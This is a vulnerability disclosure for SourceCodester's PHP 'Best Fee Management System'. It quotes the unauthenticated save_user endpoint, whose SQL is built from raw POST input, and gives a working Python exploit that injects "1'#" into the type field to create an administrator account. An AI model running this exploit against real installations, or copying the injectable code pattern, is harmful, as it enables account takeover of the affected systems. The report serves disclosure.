Best Fee Management System POC

This is the first report for the vulnerable.

[CVE search result](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Best+Fee+Management+System)
![image](https://github.com/movonow/demo/assets/39987032/77c9f56a-a37f-4850-8a69-5fd021128358)

---

## Vulnerability Type
CWE-264: Permissions, Privileges, and Access Controls

## Mitigation
There must be access control for the sentitive interfaces.

## Impact
Allows an attacker to gain full control of the system information.

## Proof of Concept
[Exploit Best-Fee-Management-System](https://youtu.be/9YG54KaF0N8)

## Software

[Best Fee Management System Homepage](https://www.sourcecodester.com/php/15357/best-fee-management-system-project-php-source-code.html)

### Vendor
[SourceCodester](https://www.sourcecodester.com/)

### source of disclosure
The vulnerable endpoint is: http://localhost/click_fees/ajax.php?action=save_user

The ajax.php just dispatch action:
```php

$action = $_GET['action'];
include 'admin_class.php';

$crud = new Action();
// .... other action ignored

if($action == 'save_user'){
	$save = $crud->save_user();
	if($save)
		echo $save;
}
```

There is no access check in `admin_class.php:save_user` function:
```php
Class Action {
    function save_user(){
        extract($_POST);
        $data = " name = '$name' ";
        $data .= ", username = '$username' ";
        if(!empty($password))
        $data .= ", password = '".md5($password)."' ";
        $data .= ", type = '$type' ";
        if($type == 1)
            $establishment_id = 0;
        $data .= ", establishment_id = '$establishment_id' ";
        $chk = $this->db->query("Select * from users where username = '$username' and id !='$id' ")->num_rows;
        if($chk > 0){
            return 2;
            exit;
        }
        if(empty($id)){
            $save = $this->db->query("INSERT INTO users set ".$data);
        }else{
            $save = $this->db->query("UPDATE users set ".$data." where id = ".$id);
        }
        if($save){
            return 1;
        }
    }
}
```

### Version 
The software is unversioned as of now (2023/7/10). Below is the tested version download link.

https://www.sourcecodester.com/sites/default/files/download/mayuri_k/click_fees_0.zip

## Exploit script
Setup: `pip install httpx`

```python
import httpx


response = httpx.post(
    url="http://localhost/click_fees/ajax.php?action=save_user",
    data={
        "name": "evil",
        "username": "evil@mars.io",
        "password": "evil",
        "type": "1'#", # SQL injection is necessary, beacuase of a server bug.
    },
    proxies="http://localhost:8080",
)

print(response.text)
```

## Steps To Reproduce
After execution of exploit script, attacker can login system with:
* username: evil@mars.io 
* password: evil
